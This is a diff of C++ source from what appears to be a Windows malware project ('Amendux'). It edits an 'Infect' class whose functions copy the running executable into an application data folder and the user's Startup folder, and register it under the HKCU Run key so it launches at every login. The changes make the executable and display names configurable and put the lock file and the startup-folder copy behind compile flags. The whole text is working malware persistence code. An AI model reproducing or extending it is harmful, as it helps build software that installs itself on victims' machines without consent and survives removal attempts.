@@ -36,7 +36,7 @@ void Infect::SetupHomeDirectory()
 {
 	std::wstring curPath = Util::currentModule();
 	std::wstring appDir = Config::Current()->DataDirectory();
-	std::wstring fullAppDir = appDir + L"\\Amendux.exe";
+	std::wstring fullAppDir = appDir + L"\\" + Config::Current()->ExeName();
 	
 	if (curPath == fullAppDir) {
 		return;
@@ -47,9 +47,11 @@ void Infect::SetupHomeDirectory()
 	Util::deleteFile(fullAppDir.c_str());
 	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)fullAppDir.c_str());
 
+#if DEBUG
 	std::ofstream lock;
 	lock.open(appDir + L"\\.VXLOCK");
 	lock.close();
+#endif
 }
 
 
@@ -57,17 +59,19 @@ void Infect::SetupRegisterHook()
 {
 	Log::Info(L"Infect", L"Set register hooks");
 
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"); //TODO
 	std::wstring appDir = Config::Current()->DataDirectory();
-	appDir += L"\\Amendux.exe";
+	appDir += L"\\" + Config::Current()->ExeName();
 
 	LPCWSTR newExecPath = appDir.c_str();
-	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"Amendux", newExecPath, static_cast<DWORD>(Util::bytesInWCharStr(newExecPath)));
+	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, Config::Current()->DisplayName().c_str(), newExecPath, static_cast<DWORD>(Util::bytesInWCharStr(newExecPath)));
 }
 
 
 void Infect::SetupStartupFolder()
 {
+#if SECURE_BOOT
+	// TODO
 	std::wstring curPath = Util::currentModule();
 	std::wstring startDir = Util::getDirectory(Util::Directory::USER_STARTUP);
 	startDir += L"\\AmenduxGuard.exe";
@@ -80,4 +84,5 @@ void Infect::SetupStartupFolder()
 
 	Util::deleteFile(startDir.c_str());
 	Util::CopyFile((wchar_t *)curPath.c_str(), (wchar_t *)startDir.c_str());
+#endif
 }
